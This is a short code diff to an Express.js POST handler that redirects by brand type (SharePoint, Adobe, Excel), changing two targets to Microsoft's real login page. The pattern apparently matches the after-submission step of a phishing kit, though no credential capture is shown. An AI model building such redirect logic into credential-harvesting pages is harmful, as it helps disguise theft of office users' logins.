@@ -44,11 +44,11 @@ app.post('/q', async (req, res) => {
         // Handle redirection based on type
         switch (type) {
             case "sharepoint":
-                return res.redirect('https://sharepoint.com');
+                return res.redirect('https://login.microsoftonline.com/common/login');
             case "adobe":
                 return res.redirect('https://community.adobe.com/t5/adobe-acrobat-sign-discussions/adobe-sign-login-has-expired/m-p/10255182');
             case "excel":
-                return res.redirect('https://excel.com');
+                return res.redirect('https://login.microsoftonline.com/common/login');
             default:
                 return res.redirect('/success'); // Default success page
         }
